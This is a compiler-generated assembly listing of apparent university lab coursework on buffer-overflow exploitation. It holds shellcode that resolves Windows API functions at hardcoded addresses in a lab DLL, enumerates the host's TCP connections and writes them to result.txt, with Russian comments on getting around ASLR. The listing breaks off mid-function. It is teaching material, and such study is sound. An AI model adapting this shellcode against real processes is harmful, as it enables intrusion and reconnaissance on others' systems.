; Listing generated by Microsoft (R) Optimizing Compiler Version 19.24.28314.0 

	TITLE	d:\activities\university\6 semester\mscs\labs\lab_2_-_buffer_overflow_exploitation\shellcode\shellcode\main.c
	.686P
	.XMM
	include listing.inc
	.model	flat

INCLUDELIB OLDNAMES

EXTRN	__imp____stdio_common_vfprintf:PROC
EXTRN	__imp__fclose:PROC
EXTRN	__imp____acrt_iob_func:PROC
EXTRN	__imp__fopen:PROC
EXTRN	__imp__fputc:PROC
EXTRN	__imp__exit:PROC
PUBLIC	_main
PUBLIC	_WriteShellCodeDecoderToFile@4
PUBLIC	_PrintAbsentInShellcodePayloadBytes@0
PUBLIC	_END_SHELLCODE_PAYLOAD@0
PUBLIC	__strlen@4
PUBLIC	_WriteUShortToFile@12
PUBLIC	_ShellcodePayload@0
PUBLIC	_ShellcodeDecoder@0
PUBLIC	_printf
PUBLIC	__vfprintf_l
PUBLIC	___local_stdio_printf_options
EXTRN	_memset:PROC
COMM	?_OptionsStorage@?1??__local_stdio_printf_options@@9@9:QWORD							; `__local_stdio_printf_options'::`2'::_OptionsStorage
_DATA	ENDS
$SG4294967284 DB 0aH, 'Shellcode size without xor = %u', 0aH, 00H
	ORG $+2
$SG4294967285 DB 'Error: fopen returned NULL', 00H
	ORG $+1
$SG4294967286 DB 'ShellcodePayload.bin', 00H
	ORG $+3
$SG4294967287 DB 'wb', 00H
	ORG $+1
$SG4294967288 DB 0aH, 'Shellcode decoder size = %u', 0aH, 00H
	ORG $+2
$SG4294967289 DB 0aH, 00H
	ORG $+2
$SG4294967290 DB '%.2x ', 00H
	ORG $+2
$SG4294967291 DB 0aH, 'Abcent bytes: ', 00H
_DATA	ENDS
; Function compile flags: /Odtp /RTCu
; File D:\Activities\University\6 semester\MSCS\Labs\Lab_2_-_Buffer_overflow_exploitation\Shellcode\Shellcode\main.c
;	COMDAT _ShellcodePayload@0
_TEXT	SEGMENT
_bytesWritten$ = -212					; size = 4
_f_free$ = -208						; size = 4
_f_GetModuleHandleA$ = -204				; size = 4
_f_ntohs$ = -200					; size = 4
_f_malloc$ = -196					; size = 4
_f_CreateFileA$ = -192					; size = 4
_hWs2_32dll$ = -188					; size = 4
_hIphlpapidll$ = -184					; size = 4
_f_WriteFile$ = -180					; size = 4
_hFile$ = -176						; size = 4
_f_GetTcpTable$ = -172					; size = 4
_f_LoadLibraryA$ = -168					; size = 4
_port$1 = -164						; size = 2
_cstrIphlpapidll$ = -160				; size = 13
_cstrLoadLobraryA$ = -144				; size = 13
_cstrKernel32dll$ = -128				; size = 13
_cstrGetTcpTable$ = -112				; size = 12
_cstrCreateFileA$ = -100				; size = 12
_cstrExitProcess$ = -88					; size = 12
_cstrFileName$ = -76					; size = 11
_cstrWs2_32dll$ = -64					; size = 11
_cstrWriteFile$ = -52					; size = 10
_cstrNtohs$ = -40					; size = 6
_dwRetVal$ = -32					; size = 4
_dwSize$ = -28						; size = 4
_hKernel32dll$ = -24					; size = 4
_i$2 = -20						; size = 4
_f_GetProcAddress$ = -16				; size = 4
_newLine$ = -9						; size = 1
_pTcpTable$ = -8					; size = 4
_f_ExitProcess$ = -4					; size = 4
_ShellcodePayload@0 PROC				; COMDAT

; 41   : {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	81 ec d4 00 00
	00		 sub	 esp, 212		; 000000d4H

; 42   : 	/*
; 43   : 		Адреса функций данного блока кода - это адреса call инструкций
; 44   : 	вызовов соответствующих функций, внутри билиотеки func.dll
; 45   : 	*/
; 46   : 	HMODULE (*f_GetModuleHandleA)(LPCSTR) = 0x62501B48;

  00009	c7 85 34 ff ff
	ff 48 1b 50 62	 mov	 DWORD PTR _f_GetModuleHandleA$[ebp], 1649417032 ; 62501b48H

; 47   : 	FARPROC (*f_GetProcAddress)(HMODULE, LPCSTR) = 0x62501B40;

  00013	c7 45 f0 40 1b
	50 62		 mov	 DWORD PTR _f_GetProcAddress$[ebp], 1649417024 ; 62501b40H

; 48   : 	void* (* __cdecl f_malloc)(size_t) = 0x62501AD8;

  0001a	c7 85 3c ff ff
	ff d8 1a 50 62	 mov	 DWORD PTR _f_malloc$[ebp], 1649416920 ; 62501ad8H

; 49   : 	void (* __cdecl f_free)(void*) = 0x62501AE8;

  00024	c7 85 30 ff ff
	ff e8 1a 50 62	 mov	 DWORD PTR _f_free$[ebp], 1649416936 ; 62501ae8H

; 50   : 
; 51   : 	/*
; 52   : 		Си строки мы задаем в таком виде, чтобы они размещались на стеке,
; 53   : 	как локальные переменные. При другом виде задания строки, строка будет
; 54   : 	размещена в секции данных, а не на стеке, что приведет к использованию 
; 55   : 	компилятором прямых адресов. Использование прямых адресово запрещено 
; 56   : 	при написании шеллкода, т.к. из-за ASLR, работающего для vuln_*.exe,
; 57   : 	адреса каждый раз будут рандомными. Т.е. нам нужно сделать так, чтобы
; 58   : 	в шеллкоде использовались только относительные адреса, что происходит 
; 59   : 	при обращении к переменным на стеке.
; 60   : 	*/
; 61   : 	char cstrKernel32dll[] = { 'K','e','r','n','e','l','3','2','.','d','l','l','\0' };

  0002e	c6 45 80 4b	 mov	 BYTE PTR _cstrKernel32dll$[ebp], 75 ; 0000004bH
  00032	c6 45 81 65	 mov	 BYTE PTR _cstrKernel32dll$[ebp+1], 101 ; 00000065H
  00036	c6 45 82 72	 mov	 BYTE PTR _cstrKernel32dll$[ebp+2], 114 ; 00000072H
  0003a	c6 45 83 6e	 mov	 BYTE PTR _cstrKernel32dll$[ebp+3], 110 ; 0000006eH
  0003e	c6 45 84 65	 mov	 BYTE PTR _cstrKernel32dll$[ebp+4], 101 ; 00000065H
  00042	c6 45 85 6c	 mov	 BYTE PTR _cstrKernel32dll$[ebp+5], 108 ; 0000006cH
  00046	c6 45 86 33	 mov	 BYTE PTR _cstrKernel32dll$[ebp+6], 51 ; 00000033H
  0004a	c6 45 87 32	 mov	 BYTE PTR _cstrKernel32dll$[ebp+7], 50 ; 00000032H
  0004e	c6 45 88 2e	 mov	 BYTE PTR _cstrKernel32dll$[ebp+8], 46 ; 0000002eH
  00052	c6 45 89 64	 mov	 BYTE PTR _cstrKernel32dll$[ebp+9], 100 ; 00000064H
  00056	c6 45 8a 6c	 mov	 BYTE PTR _cstrKernel32dll$[ebp+10], 108 ; 0000006cH
  0005a	c6 45 8b 6c	 mov	 BYTE PTR _cstrKernel32dll$[ebp+11], 108 ; 0000006cH
  0005e	c6 45 8c 00	 mov	 BYTE PTR _cstrKernel32dll$[ebp+12], 0

; 62   : 	HMODULE hKernel32dll = f_GetModuleHandleA(cstrKernel32dll);

  00062	8d 45 80	 lea	 eax, DWORD PTR _cstrKernel32dll$[ebp]
  00065	50		 push	 eax
  00066	ff 95 34 ff ff
	ff		 call	 DWORD PTR _f_GetModuleHandleA$[ebp]
  0006c	89 45 e8	 mov	 DWORD PTR _hKernel32dll$[ebp], eax

; 63   : 
; 64   : 	char cstrExitProcess[] = { 'E','x','i','t','P','r','o','c','e','s','s','\0' };

  0006f	c6 45 a8 45	 mov	 BYTE PTR _cstrExitProcess$[ebp], 69 ; 00000045H
  00073	c6 45 a9 78	 mov	 BYTE PTR _cstrExitProcess$[ebp+1], 120 ; 00000078H
  00077	c6 45 aa 69	 mov	 BYTE PTR _cstrExitProcess$[ebp+2], 105 ; 00000069H
  0007b	c6 45 ab 74	 mov	 BYTE PTR _cstrExitProcess$[ebp+3], 116 ; 00000074H
  0007f	c6 45 ac 50	 mov	 BYTE PTR _cstrExitProcess$[ebp+4], 80 ; 00000050H
  00083	c6 45 ad 72	 mov	 BYTE PTR _cstrExitProcess$[ebp+5], 114 ; 00000072H
  00087	c6 45 ae 6f	 mov	 BYTE PTR _cstrExitProcess$[ebp+6], 111 ; 0000006fH
  0008b	c6 45 af 63	 mov	 BYTE PTR _cstrExitProcess$[ebp+7], 99 ; 00000063H
  0008f	c6 45 b0 65	 mov	 BYTE PTR _cstrExitProcess$[ebp+8], 101 ; 00000065H
  00093	c6 45 b1 73	 mov	 BYTE PTR _cstrExitProcess$[ebp+9], 115 ; 00000073H
  00097	c6 45 b2 73	 mov	 BYTE PTR _cstrExitProcess$[ebp+10], 115 ; 00000073H
  0009b	c6 45 b3 00	 mov	 BYTE PTR _cstrExitProcess$[ebp+11], 0

; 65   : 	void (*f_ExitProcess)(UINT) = f_GetProcAddress(hKernel32dll, cstrExitProcess);

  0009f	8d 4d a8	 lea	 ecx, DWORD PTR _cstrExitProcess$[ebp]
  000a2	51		 push	 ecx
  000a3	8b 55 e8	 mov	 edx, DWORD PTR _hKernel32dll$[ebp]
  000a6	52		 push	 edx
  000a7	ff 55 f0	 call	 DWORD PTR _f_GetProcAddress$[ebp]
  000aa	89 45 fc	 mov	 DWORD PTR _f_ExitProcess$[ebp], eax

; 66   : 
; 67   : 	char cstrCreateFileA[] = { 'C','r','e','a','t','e','F','i','l','e','A','\0' };

  000ad	c6 45 9c 43	 mov	 BYTE PTR _cstrCreateFileA$[ebp], 67 ; 00000043H
  000b1	c6 45 9d 72	 mov	 BYTE PTR _cstrCreateFileA$[ebp+1], 114 ; 00000072H
  000b5	c6 45 9e 65	 mov	 BYTE PTR _cstrCreateFileA$[ebp+2], 101 ; 00000065H
  000b9	c6 45 9f 61	 mov	 BYTE PTR _cstrCreateFileA$[ebp+3], 97 ; 00000061H
  000bd	c6 45 a0 74	 mov	 BYTE PTR _cstrCreateFileA$[ebp+4], 116 ; 00000074H
  000c1	c6 45 a1 65	 mov	 BYTE PTR _cstrCreateFileA$[ebp+5], 101 ; 00000065H
  000c5	c6 45 a2 46	 mov	 BYTE PTR _cstrCreateFileA$[ebp+6], 70 ; 00000046H
  000c9	c6 45 a3 69	 mov	 BYTE PTR _cstrCreateFileA$[ebp+7], 105 ; 00000069H
  000cd	c6 45 a4 6c	 mov	 BYTE PTR _cstrCreateFileA$[ebp+8], 108 ; 0000006cH
  000d1	c6 45 a5 65	 mov	 BYTE PTR _cstrCreateFileA$[ebp+9], 101 ; 00000065H
  000d5	c6 45 a6 41	 mov	 BYTE PTR _cstrCreateFileA$[ebp+10], 65 ; 00000041H
  000d9	c6 45 a7 00	 mov	 BYTE PTR _cstrCreateFileA$[ebp+11], 0

; 68   : 	HANDLE (*f_CreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE) 

  000dd	8d 45 9c	 lea	 eax, DWORD PTR _cstrCreateFileA$[ebp]
  000e0	50		 push	 eax
  000e1	8b 4d e8	 mov	 ecx, DWORD PTR _hKernel32dll$[ebp]
  000e4	51		 push	 ecx
  000e5	ff 55 f0	 call	 DWORD PTR _f_GetProcAddress$[ebp]
  000e8	89 85 40 ff ff
	ff		 mov	 DWORD PTR _f_CreateFileA$[ebp], eax

; 69   : 		= f_GetProcAddress(hKernel32dll, cstrCreateFileA);
; 70   : 	if (f_CreateFileA == NULL)

  000ee	83 bd 40 ff ff
	ff 00		 cmp	 DWORD PTR _f_CreateFileA$[ebp], 0
  000f5	75 05		 jne	 SHORT $LN5@ShellcodeP

; 71   : 	{
; 72   : 		f_ExitProcess(2);

  000f7	6a 02		 push	 2
  000f9	ff 55 fc	 call	 DWORD PTR _f_ExitProcess$[ebp]
$LN5@ShellcodeP:

; 73   : 	}
; 74   : 
; 75   : 	char cstrWriteFile[] = { 'W','r','i','t','e','F','i','l','e','\0' };

  000fc	c6 45 cc 57	 mov	 BYTE PTR _cstrWriteFile$[ebp], 87 ; 00000057H
  00100	c6 45 cd 72	 mov	 BYTE PTR _cstrWriteFile$[ebp+1], 114 ; 00000072H
  00104	c6 45 ce 69	 mov	 BYTE PTR _cstrWriteFile$[ebp+2], 105 ; 00000069H
  00108	c6 45 cf 74	 mov	 BYTE PTR _cstrWriteFile$[ebp+3], 116 ; 00000074H
  0010c	c6 45 d0 65	 mov	 BYTE PTR _cstrWriteFile$[ebp+4], 101 ; 00000065H
  00110	c6 45 d1 46	 mov	 BYTE PTR _cstrWriteFile$[ebp+5], 70 ; 00000046H
  00114	c6 45 d2 69	 mov	 BYTE PTR _cstrWriteFile$[ebp+6], 105 ; 00000069H
  00118	c6 45 d3 6c	 mov	 BYTE PTR _cstrWriteFile$[ebp+7], 108 ; 0000006cH
  0011c	c6 45 d4 65	 mov	 BYTE PTR _cstrWriteFile$[ebp+8], 101 ; 00000065H
  00120	c6 45 d5 00	 mov	 BYTE PTR _cstrWriteFile$[ebp+9], 0

; 76   : 	BOOL(*f_WriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED) = f_GetProcAddress(hKernel32dll, cstrWriteFile);

  00124	8d 55 cc	 lea	 edx, DWORD PTR _cstrWriteFile$[ebp]
  00127	52		 push	 edx
  00128	8b 45 e8	 mov	 eax, DWORD PTR _hKernel32dll$[ebp]
  0012b	50		 push	 eax
  0012c	ff 55 f0	 call	 DWORD PTR _f_GetProcAddress$[ebp]
  0012f	89 85 4c ff ff
	ff		 mov	 DWORD PTR _f_WriteFile$[ebp], eax

; 77   : 	if (f_WriteFile == NULL)

  00135	83 bd 4c ff ff
	ff 00		 cmp	 DWORD PTR _f_WriteFile$[ebp], 0
  0013c	75 05		 jne	 SHORT $LN6@ShellcodeP

; 78   : 	{
; 79   : 		f_ExitProcess(3);

  0013e	6a 03		 push	 3
  00140	ff 55 fc	 call	 DWORD PTR _f_ExitProcess$[ebp]
$LN6@ShellcodeP:

; 80   : 	}
; 81   : 
; 82   : 	char cstrLoadLobraryA[] = { 'L','o','a','d','L','i','b','r','a','r','y','A','\0' };

  00143	c6 85 70 ff ff
	ff 4c		 mov	 BYTE PTR _cstrLoadLobraryA$[ebp], 76 ; 0000004cH
  0014a	c6 85 71 ff ff
	ff 6f		 mov	 BYTE PTR _cstrLoadLobraryA$[ebp+1], 111 ; 0000006fH
  00151	c6 85 72 ff ff
	ff 61		 mov	 BYTE PTR _cstrLoadLobraryA$[ebp+2], 97 ; 00000061H
  00158	c6 85 73 ff ff
	ff 64		 mov	 BYTE PTR _cstrLoadLobraryA$[ebp+3], 100 ; 00000064H
  0015f	c6 85 74 ff ff
	ff 4c		 mov	 BYTE PTR _cstrLoadLobraryA$[ebp+4], 76 ; 0000004cH
  00166	c6 85 75 ff ff
	ff 69		 mov	 BYTE PTR _cstrLoadLobraryA$[ebp+5], 105 ; 00000069H
  0016d	c6 85 76 ff ff
	ff 62		 mov	 BYTE PTR _cstrLoadLobraryA$[ebp+6], 98 ; 00000062H
  00174	c6 85 77 ff ff
	ff 72		 mov	 BYTE PTR _cstrLoadLobraryA$[ebp+7], 114 ; 00000072H
  0017b	c6 85 78 ff ff
	ff 61		 mov	 BYTE PTR _cstrLoadLobraryA$[ebp+8], 97 ; 00000061H
  00182	c6 85 79 ff ff
	ff 72		 mov	 BYTE PTR _cstrLoadLobraryA$[ebp+9], 114 ; 00000072H
  00189	c6 85 7a ff ff
	ff 79		 mov	 BYTE PTR _cstrLoadLobraryA$[ebp+10], 121 ; 00000079H
  00190	c6 85 7b ff ff
	ff 41		 mov	 BYTE PTR _cstrLoadLobraryA$[ebp+11], 65 ; 00000041H
  00197	c6 85 7c ff ff
	ff 00		 mov	 BYTE PTR _cstrLoadLobraryA$[ebp+12], 0

; 83   : 	HMODULE(*f_LoadLibraryA)(LPCSTR) = f_GetProcAddress(hKernel32dll, cstrLoadLobraryA);

  0019e	8d 8d 70 ff ff
	ff		 lea	 ecx, DWORD PTR _cstrLoadLobraryA$[ebp]
  001a4	51		 push	 ecx
  001a5	8b 55 e8	 mov	 edx, DWORD PTR _hKernel32dll$[ebp]
  001a8	52		 push	 edx
  001a9	ff 55 f0	 call	 DWORD PTR _f_GetProcAddress$[ebp]
  001ac	89 85 58 ff ff
	ff		 mov	 DWORD PTR _f_LoadLibraryA$[ebp], eax

; 84   : 	if (f_LoadLibraryA == NULL)

  001b2	83 bd 58 ff ff
	ff 00		 cmp	 DWORD PTR _f_LoadLibraryA$[ebp], 0
  001b9	75 05		 jne	 SHORT $LN7@ShellcodeP

; 85   : 	{
; 86   : 		f_ExitProcess(4);

  001bb	6a 04		 push	 4
  001bd	ff 55 fc	 call	 DWORD PTR _f_ExitProcess$[ebp]
$LN7@ShellcodeP:

; 87   : 	}
; 88   : 
; 89   : 	char cstrIphlpapidll[] = { 'I','p','h','l','p','a','p','i','.','d','l','l','\0' };

  001c0	c6 85 60 ff ff
	ff 49		 mov	 BYTE PTR _cstrIphlpapidll$[ebp], 73 ; 00000049H
  001c7	c6 85 61 ff ff
	ff 70		 mov	 BYTE PTR _cstrIphlpapidll$[ebp+1], 112 ; 00000070H
  001ce	c6 85 62 ff ff
	ff 68		 mov	 BYTE PTR _cstrIphlpapidll$[ebp+2], 104 ; 00000068H
  001d5	c6 85 63 ff ff
	ff 6c		 mov	 BYTE PTR _cstrIphlpapidll$[ebp+3], 108 ; 0000006cH
  001dc	c6 85 64 ff ff
	ff 70		 mov	 BYTE PTR _cstrIphlpapidll$[ebp+4], 112 ; 00000070H
  001e3	c6 85 65 ff ff
	ff 61		 mov	 BYTE PTR _cstrIphlpapidll$[ebp+5], 97 ; 00000061H
  001ea	c6 85 66 ff ff
	ff 70		 mov	 BYTE PTR _cstrIphlpapidll$[ebp+6], 112 ; 00000070H
  001f1	c6 85 67 ff ff
	ff 69		 mov	 BYTE PTR _cstrIphlpapidll$[ebp+7], 105 ; 00000069H
  001f8	c6 85 68 ff ff
	ff 2e		 mov	 BYTE PTR _cstrIphlpapidll$[ebp+8], 46 ; 0000002eH
  001ff	c6 85 69 ff ff
	ff 64		 mov	 BYTE PTR _cstrIphlpapidll$[ebp+9], 100 ; 00000064H
  00206	c6 85 6a ff ff
	ff 6c		 mov	 BYTE PTR _cstrIphlpapidll$[ebp+10], 108 ; 0000006cH
  0020d	c6 85 6b ff ff
	ff 6c		 mov	 BYTE PTR _cstrIphlpapidll$[ebp+11], 108 ; 0000006cH
  00214	c6 85 6c ff ff
	ff 00		 mov	 BYTE PTR _cstrIphlpapidll$[ebp+12], 0

; 90   : 	HMODULE hIphlpapidll = f_LoadLibraryA(cstrIphlpapidll);

  0021b	8d 85 60 ff ff
	ff		 lea	 eax, DWORD PTR _cstrIphlpapidll$[ebp]
  00221	50		 push	 eax
  00222	ff 95 58 ff ff
	ff		 call	 DWORD PTR _f_LoadLibraryA$[ebp]
  00228	89 85 48 ff ff
	ff		 mov	 DWORD PTR _hIphlpapidll$[ebp], eax

; 91   : 	if (hIphlpapidll == NULL)

  0022e	83 bd 48 ff ff
	ff 00		 cmp	 DWORD PTR _hIphlpapidll$[ebp], 0
  00235	75 05		 jne	 SHORT $LN8@ShellcodeP

; 92   : 	{
; 93   : 		f_ExitProcess(5);

  00237	6a 05		 push	 5
  00239	ff 55 fc	 call	 DWORD PTR _f_ExitProcess$[ebp]
$LN8@ShellcodeP:

; 94   : 	}
; 95   : 
; 96   : 	char cstrGetTcpTable[] = { 'G','e','t','T','c','p','T','a','b','l','e','\0' };

  0023c	c6 45 90 47	 mov	 BYTE PTR _cstrGetTcpTable$[ebp], 71 ; 00000047H
  00240	c6 45 91 65	 mov	 BYTE PTR _cstrGetTcpTable$[ebp+1], 101 ; 00000065H
  00244	c6 45 92 74	 mov	 BYTE PTR _cstrGetTcpTable$[ebp+2], 116 ; 00000074H
  00248	c6 45 93 54	 mov	 BYTE PTR _cstrGetTcpTable$[ebp+3], 84 ; 00000054H
  0024c	c6 45 94 63	 mov	 BYTE PTR _cstrGetTcpTable$[ebp+4], 99 ; 00000063H
  00250	c6 45 95 70	 mov	 BYTE PTR _cstrGetTcpTable$[ebp+5], 112 ; 00000070H
  00254	c6 45 96 54	 mov	 BYTE PTR _cstrGetTcpTable$[ebp+6], 84 ; 00000054H
  00258	c6 45 97 61	 mov	 BYTE PTR _cstrGetTcpTable$[ebp+7], 97 ; 00000061H
  0025c	c6 45 98 62	 mov	 BYTE PTR _cstrGetTcpTable$[ebp+8], 98 ; 00000062H
  00260	c6 45 99 6c	 mov	 BYTE PTR _cstrGetTcpTable$[ebp+9], 108 ; 0000006cH
  00264	c6 45 9a 65	 mov	 BYTE PTR _cstrGetTcpTable$[ebp+10], 101 ; 00000065H
  00268	c6 45 9b 00	 mov	 BYTE PTR _cstrGetTcpTable$[ebp+11], 0

; 97   : 	ULONG(*f_GetTcpTable)(PMIB_TCPTABLE, PULONG, BOOL) = f_GetProcAddress(hIphlpapidll, cstrGetTcpTable);

  0026c	8d 4d 90	 lea	 ecx, DWORD PTR _cstrGetTcpTable$[ebp]
  0026f	51		 push	 ecx
  00270	8b 95 48 ff ff
	ff		 mov	 edx, DWORD PTR _hIphlpapidll$[ebp]
  00276	52		 push	 edx
  00277	ff 55 f0	 call	 DWORD PTR _f_GetProcAddress$[ebp]
  0027a	89 85 54 ff ff
	ff		 mov	 DWORD PTR _f_GetTcpTable$[ebp], eax

; 98   : 	if (f_GetTcpTable == NULL)

  00280	83 bd 54 ff ff
	ff 00		 cmp	 DWORD PTR _f_GetTcpTable$[ebp], 0
  00287	75 05		 jne	 SHORT $LN9@ShellcodeP

; 99   : 	{
; 100  : 		f_ExitProcess(7);

  00289	6a 07		 push	 7
  0028b	ff 55 fc	 call	 DWORD PTR _f_ExitProcess$[ebp]
$LN9@ShellcodeP:

; 101  : 	}
; 102  : 
; 103  : 	char cstrWs2_32dll[] = { 'W','s','2','_','3','2','.','d','l','l','\0' };

  0028e	c6 45 c0 57	 mov	 BYTE PTR _cstrWs2_32dll$[ebp], 87 ; 00000057H
  00292	c6 45 c1 73	 mov	 BYTE PTR _cstrWs2_32dll$[ebp+1], 115 ; 00000073H
  00296	c6 45 c2 32	 mov	 BYTE PTR _cstrWs2_32dll$[ebp+2], 50 ; 00000032H
  0029a	c6 45 c3 5f	 mov	 BYTE PTR _cstrWs2_32dll$[ebp+3], 95 ; 0000005fH
  0029e	c6 45 c4 33	 mov	 BYTE PTR _cstrWs2_32dll$[ebp+4], 51 ; 00000033H
  002a2	c6 45 c5 32	 mov	 BYTE PTR _cstrWs2_32dll$[ebp+5], 50 ; 00000032H
  002a6	c6 45 c6 2e	 mov	 BYTE PTR _cstrWs2_32dll$[ebp+6], 46 ; 0000002eH
  002aa	c6 45 c7 64	 mov	 BYTE PTR _cstrWs2_32dll$[ebp+7], 100 ; 00000064H
  002ae	c6 45 c8 6c	 mov	 BYTE PTR _cstrWs2_32dll$[ebp+8], 108 ; 0000006cH
  002b2	c6 45 c9 6c	 mov	 BYTE PTR _cstrWs2_32dll$[ebp+9], 108 ; 0000006cH
  002b6	c6 45 ca 00	 mov	 BYTE PTR _cstrWs2_32dll$[ebp+10], 0

; 104  : 	HMODULE hWs2_32dll = f_LoadLibraryA(cstrWs2_32dll);

  002ba	8d 45 c0	 lea	 eax, DWORD PTR _cstrWs2_32dll$[ebp]
  002bd	50		 push	 eax
  002be	ff 95 58 ff ff
	ff		 call	 DWORD PTR _f_LoadLibraryA$[ebp]
  002c4	89 85 44 ff ff
	ff		 mov	 DWORD PTR _hWs2_32dll$[ebp], eax

; 105  : 	if (hWs2_32dll == NULL)

  002ca	83 bd 44 ff ff
	ff 00		 cmp	 DWORD PTR _hWs2_32dll$[ebp], 0
  002d1	75 05		 jne	 SHORT $LN10@ShellcodeP

; 106  : 	{
; 107  : 		f_ExitProcess(8);

  002d3	6a 08		 push	 8
  002d5	ff 55 fc	 call	 DWORD PTR _f_ExitProcess$[ebp]
$LN10@ShellcodeP:

; 108  : 	}
; 109  : 
; 110  : 	char cstrNtohs[] = { 'n','t','o','h','s','\0' };

  002d8	c6 45 d8 6e	 mov	 BYTE PTR _cstrNtohs$[ebp], 110 ; 0000006eH
  002dc	c6 45 d9 74	 mov	 BYTE PTR _cstrNtohs$[ebp+1], 116 ; 00000074H
  002e0	c6 45 da 6f	 mov	 BYTE PTR _cstrNtohs$[ebp+2], 111 ; 0000006fH
  002e4	c6 45 db 68	 mov	 BYTE PTR _cstrNtohs$[ebp+3], 104 ; 00000068H
  002e8	c6 45 dc 73	 mov	 BYTE PTR _cstrNtohs$[ebp+4], 115 ; 00000073H
  002ec	c6 45 dd 00	 mov	 BYTE PTR _cstrNtohs$[ebp+5], 0

; 111  : 	u_short(*f_ntohs)(u_short) = f_GetProcAddress(hWs2_32dll, cstrNtohs);

  002f0	8d 4d d8	 lea	 ecx, DWORD PTR _cstrNtohs$[ebp]
  002f3	51		 push	 ecx
  002f4	8b 95 44 ff ff
	ff		 mov	 edx, DWORD PTR _hWs2_32dll$[ebp]
  002fa	52		 push	 edx
  002fb	ff 55 f0	 call	 DWORD PTR _f_GetProcAddress$[ebp]
  002fe	89 85 38 ff ff
	ff		 mov	 DWORD PTR _f_ntohs$[ebp], eax

; 112  : 	if (f_ntohs == NULL)

  00304	83 bd 38 ff ff
	ff 00		 cmp	 DWORD PTR _f_ntohs$[ebp], 0
  0030b	75 05		 jne	 SHORT $LN11@ShellcodeP

; 113  : 	{
; 114  : 		f_ExitProcess(9);

  0030d	6a 09		 push	 9
  0030f	ff 55 fc	 call	 DWORD PTR _f_ExitProcess$[ebp]
$LN11@ShellcodeP:

; 115  : 	}
; 116  : 
; 117  : 	// NOTE: It's opening of file
; 118  : 	char cstrFileName[] = { 'r','e','s','u','l','t','.','t','x','t','\0' };

  00312	c6 45 b4 72	 mov	 BYTE PTR _cstrFileName$[ebp], 114 ; 00000072H
  00316	c6 45 b5 65	 mov	 BYTE PTR _cstrFileName$[ebp+1], 101 ; 00000065H
  0031a	c6 45 b6 73	 mov	 BYTE PTR _cstrFileName$[ebp+2], 115 ; 00000073H
  0031e	c6 45 b7 75	 mov	 BYTE PTR _cstrFileName$[ebp+3], 117 ; 00000075H
  00322	c6 45 b8 6c	 mov	 BYTE PTR _cstrFileName$[ebp+4], 108 ; 0000006cH
  00326	c6 45 b9 74	 mov	 BYTE PTR _cstrFileName$[ebp+5], 116 ; 00000074H
  0032a	c6 45 ba 2e	 mov	 BYTE PTR _cstrFileName$[ebp+6], 46 ; 0000002eH
  0032e	c6 45 bb 74	 mov	 BYTE PTR _cstrFileName$[ebp+7], 116 ; 00000074H
  00332	c6 45 bc 78	 mov	 BYTE PTR _cstrFileName$[ebp+8], 120 ; 00000078H
  00336	c6 45 bd 74	 mov	 BYTE PTR _cstrFileName$[ebp+9], 116 ; 00000074H
  0033a	c6 45 be 00	 mov	 BYTE PTR _cstrFileName$[ebp+10], 0

; 119  : 	HANDLE hFile = f_CreateFileA(cstrFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);

  0033e	6a 00		 push	 0
  00340	6a 00		 push	 0
  00342	6a 02		 push	 2
  00344	6a 00		 push	 0
  00346	6a 00		 push	 0
  00348	68 00 00 00 40	 push	 1073741824		; 40000000H
  0034d	8d 45 b4	 lea	 eax, DWORD PTR _cstrFileName$[ebp]
  00350	50		 push	 eax
  00351	ff 95 40 ff ff
	ff		 call	 DWORD PTR _f_CreateFileA$[ebp]
  00357	89 85 50 ff ff
	ff		 mov	 DWORD PTR _hFile$[ebp], eax

; 120  : 	if (hFile == INVALID_HANDLE_VALUE)

  0035d	83 bd 50 ff ff
	ff ff		 cmp	 DWORD PTR _hFile$[ebp], -1
  00364	75 05		 jne	 SHORT $LN12@ShellcodeP

; 121  : 	{
; 122  : 		f_ExitProcess(5);

  00366	6a 05		 push	 5
  00368	ff 55 fc	 call	 DWORD PTR _f_ExitProcess$[ebp]
$LN12@ShellcodeP:

; 123  : 	}
; 124  : 
; 125  : 	/*
; 126  : 		Источник большей части кода нижележащего кода:
; 127  : 	https://docs.microsoft.com/en-us/windows/win32/api/iphlpapi/nf-iphlpapi-gettcptable
; 128  : 	Оригинал был сильно порезан.
; 129  : 	*/
; 130  : 
; 131  : 	PMIB_TCPTABLE pTcpTable;
; 132  : 	DWORD dwSize = 0;

  0036b	c7 45 e4 00 00
	00 00		 mov	 DWORD PTR _dwSize$[ebp], 0

; 133  : 	DWORD dwRetVal = 0;

  00372	c7 45 e0 00 00
	00 00		 mov	 DWORD PTR _dwRetVal$[ebp], 0

; 134  : 
; 135  : 	pTcpTable = (MIB_TCPTABLE*)f_malloc(sizeof(MIB_TCPTABLE));

  00379	6a 18		 push	 24			; 00000018H
  0037b	ff 95 3c ff ff
	ff		 call	 DWORD PTR _f_malloc$[ebp]
  00381	89 45 f8	 mov	 DWORD PTR _pTcpTable$[ebp], eax

; 136  : 	if (pTcpTable == NULL) 

  00384	83 7d f8 00	 cmp	 DWORD PTR _pTcpTable$[ebp], 0
  00388	75 05		 jne	 SHORT $LN13@ShellcodeP

; 137  : 	{
; 138  : 		f_ExitProcess(10);

  0038a	6a 0a		 push	 10			; 0000000aH
  0038c	ff 55 fc	 call	 DWORD PTR _f_ExitProcess$[ebp]
$LN13@ShellcodeP:

; 139  : 	}
; 140  : 
; 141  : 	dwSize = sizeof(MIB_TCPTABLE);

  0038f	c7 45 e4 18 00
	00 00		 mov	 DWORD PTR _dwSize$[ebp], 24 ; 00000018H

; 142  : 	if ((dwRetVal = f_GetTcpTable(pTcpTable, &dwSize, TRUE)) == ERROR_INSUFFICIENT_BUFFER) 

  00396	6a 01		 push	 1
  00398	8d 4d e4	 lea	 ecx, DWORD PTR _dwSize$[ebp]
  0039b	51		 push	 ecx
  0039c	8b 55 f8	 mov	 edx, DWORD PTR _pTcpTable$[ebp]
  0039f	52		 push	 edx
  003a0	ff 95 54 ff ff
	ff		 call	 DWORD PTR _f_GetTcpTable$[ebp]
  003a6	89 45 e0	 mov	 DWORD PTR _dwRetVal$[ebp], eax
  003a9	83 7d e0 7a	 cmp	 DWORD PTR _dwRetVal$[ebp], 122 ; 0000007aH
  003ad	75 22		 jne	 SHORT $LN14@ShellcodeP

; 143  : 	{
; 144  : 		f_free(pTcpTable);

